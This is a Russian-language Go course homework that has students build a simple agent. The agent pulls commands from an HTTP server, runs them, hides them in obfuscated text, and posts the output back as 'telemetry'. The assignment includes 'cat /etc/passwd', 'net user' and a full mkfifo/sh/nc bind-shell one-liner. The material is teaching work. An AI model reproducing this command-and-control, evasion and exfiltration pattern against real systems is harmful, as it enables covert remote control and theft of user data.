# Домашнее задание к занятию «Программирование на Go - внешние библиотеки»

В качестве результата пришлите ответы на вопросы в личном кабинете студента на сайте [netology.ru](https://netology.ru).

**Важно**: GoLand устанавливать не обязательно (но очень желательно), вы можете набирать текст программ в любом текстовом редакторе и запускать из консоли командой: `go run main.go`, либо собирать с помощью команды: `go build -o main main.go`.

## Задача "Commands executing"

### Легенда

На основании проекта с лекции реализовать исполнение команд агентом.

### Выполнение

**Важно**: не забывайте после изменения кода сервера или клиента перезапускать их.

1. У вас есть готовый сервер, отдающий команду `cat /etc/passwd`
1. У вас есть готовый клиент, который умеет читать тело ответа
1. Осталось "закинуть тело" ответа в `system` (см. прошлые ДЗ)
   
### Результаты

В качестве результата пришлите: исходный код вашего приложения (запакуйте в zip-архив или выложите проект на GitHub, если вы посмотрели лекции по Git)

## Задача "Windows/Linux"*

**Важно**: данная задача не является обязательной, её (не)выполнение не влияет на получение зачёта по ДЗ. 

### Легенда

Как вы помните, команды могут быть разные для разных ОС. Почему бы не использовать переменную `GOOS`, для того, чтобы оповещать сервер о том, на какой операционной системе работает клиент?

### Выполнение

**Важно**: не забывайте после изменения кода сервера или клиента перезапускать их.

1\. Необходимо добавить отправку информации об ОС в строке запроса на клиенте, так, чтобы получалось:

```
GET http://localhost:9999/updates?os=linux
```

Всё, что идёт после вопросительного знака в формате `key=value` до символа `#` или конца строки (если символа решётки нет) называется Query Params (иногда часть `=value` может отсутствовать).

В частности, HTML-формы, отправляемые запросом GET (например, поиск Google, Yandex и других сервисах - Booking, etc) попадают именно в Query Params.
   
<details>
<summary>Подсказка</summary>

```go
resp, err := client.Get("http://localhost:9999/updates?os=" + runtime.GOOS)
```

Примечание*: это можно сделать и более "красиво", но для нас: самый простой метод - самый удобный.
</details>

2\. Необходимо извлечь передаваемые данные об ОС на сервере с помощью метода [`FormValue` у структуры `http.Request`](https://golang.org/pkg/net/http/#Request.FormValue) и исходя из них отдавать команды

<details>
<summary>Подсказка</summary>

```go
value := request.FormValue("os")
if value == "linux" {
    writer.Write([]byte("cat /etc/passwd"))
    // позволяет завершить выполнение функции
    // не делайте os.Exit() - это завершит работу всего сервера
    return
}
if value == "windows" {
    writer.Write([]byte("net user"))
    return
}
```
</details>

3\. Удостоверьтесь, что это работает под различными ОС (как минимум, Linux и Windows)

### Результаты

В качестве результата пришлите: исходный код вашего приложения (запакуйте в zip-архив или выложите проект на GitHub, если вы посмотрели лекции по Git)

## Задача "Hiding & netcat shell"*

**Важно**: данная задача не является обязательной, её (не)выполнение не влияет на получение зачёта по ДЗ.

### Легенда

Как мы уже говорили, отправка команд в явном виде выглядит слишком подозрительно. Почему бы нам не воспользоваться простейшими знаниями из истории криптографии и попробовать "скрыть" передаваемые команды. Например, договориться, что мы читаем каждый третий символ из ответа, таким образом составляя команду, которую необходимо выполнить.

**Q**: О чём идёт речь?

**A**: например, сервер нам будет присылать вот такой бессвязный текст в ответ на `GET http://localhost:9999/updates`:
```no-exc.v10 libc-v2  ldd10 stux2020.20 c.2020.10.04```

Если клиент будет брать каждый "пятый" символ, начиная с 0-го (0, 5, 10, 15, 20, и т.д.), то рано или поздно мы получим команду `nc -l 2221`.

**Важно**: в целях упрощения мы будем брать фиксированные индексы и фиксированную длину команды, которую присылает сервер. Важно, чтобы тело ответа, присылаемое сервером было достаточным для того, чтобы вы могли извлечь все нужные байты.

<details>
<summary>Код</summary>

Например:
```go
package main

import (
	"log"
)

func main() {
	data := []byte("no-exc.v10 libc-v2  ldd10 stux2020.20 c.2020.10.04")
	cmd := []byte{data[0], data[5], data[10], data[15], data[20], data[25], data[30], data[35], data[40], data[45]}
	log.Print(string(cmd))
}
```
</details>

Попробуйте закодировать подобным образом следующую команду: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc -l 12853 > /tmp/f` (необязательно кодировать через 5 символов, можно больше, можно меньше).

<details>
<summary>Как не собирать руками на клиенте?</summary>

Поскольку собирать руками такую команду достаточно утомительно, мы можем написать кусочек кода, который это сделает за нас:
```go
package main

import (
	"log"
)

func main() {
	data := []byte("no-exc.v10 libc-v2  ldd10 stux2020.20 c.2020.10.04")
	// создаём пустой слайс для наполения данными
	cmd := make([]byte, 0)
	// переменная для хранения индекса
	index := 0
	// пока индекс меньше, чем длина ответа от сервера
	// (воспринимайте как if, который повторяется автоматически до тех пор, пока выполняется условие)
	for index < len(data) {
		// стандартная конструкция добавления в слайс значения
		cmd = append(cmd, data[index])
		// увеличиваем index на 5
		// = работает справа налево:
		// 1. сначала справа вычисляется значение: index + 5
		// 2. вычисленное на шаге 1 значение записывается обратно в index
		index = index + 5
	}

	log.Print(string(cmd))
}
```

</details>

И отправьте её с сервера на клиент под ОС Linux и попробуйте подключиться к нему (к клиенту) с помощью команды (выполняйте в терминале): `nc <ip клиента> 12853` (firewall на клиенте должен быть отключен).

### Результаты

В качестве результата пришлите:
1. Исходный код вашего приложения (запакуйте в zip-архив или выложите проект на GitHub, если вы посмотрели лекции по Git)
1. Ответ на вопрос: "что именно и как делает указанная команда"

И отправьте её с сервера на клиент под ОС Linux и попробуйте подключиться к нему с помощью команды (выполняйте в терминале): `nc <ip клиента> 12853`.

## Задача "Telemetry"*

**Важно**: данная задача не является обязательной, её (не)выполнение не влияет на получение зачёта по ДЗ.

### Легенда

Мы научились собирать данные от команд, запускаемых с помощью пакета `exec`. Давайте попробуем отправить эти данные на сервер (при этом мы назвали задачу "Telemetry" - будем "эмулировать" стандартный процесс приложений, которые в благонамеренных целях собирают данные об устройстве пользователя).

Для этого воспользуемся нашим HTTP клиентом и его методом `Post`:
```go
resp, err := client.Post("http://localhost:9999/telemetry", "", bytes.NewReader(info))
```

Где, `info` - это слайс байт, а `bytes.NewReader` - функция, позволяющая создать специализированный тип для передачи данных в запрос (`io.Reader`).

Как это прочитать на сервере? Достаточно просто, почти так же, как мы читали тело ответа на клиенте, только теперь мы будем читать тело запроса на сервере:
```go
func (h Handler) ServeHTTP(writer http.ResponseWriter, request *http.Request) {
	data, err := ioutil.ReadAll(request.Body)
	if err != nil {
		log.Print(err)
		return
	}
	log.Print(string(data))
}
```

Что нужно сделать? Прямо в том же проекте:

#### На сервере

Реализуйте в `ServeHTTP` следующую логику:
1. Если приходит запрос типа `GET`, то вы отдаёте команду
1. Если приходит запрос типа `POST`, то вы читаете `Body` и выводите его в консоль

Для получения метода запроса используйте поле `request.Method`.

#### На клиенте

1. При запуске получайте команду для исполнения с `http://localhost:9999/updates`
1. Если команда равна `user info`, то используйте `user.Current()` и отправляйте в виде JSON информацию о пользователе
1. Если команда не равна `user info`, то выполняйте команду и отсылайте полученные данные с помощью POST

### Результаты

В качестве результата пришлите: исходный код вашего приложения (запакуйте в zip-архив или выложите проект на GitHub, если вы посмотрели лекции по Git)
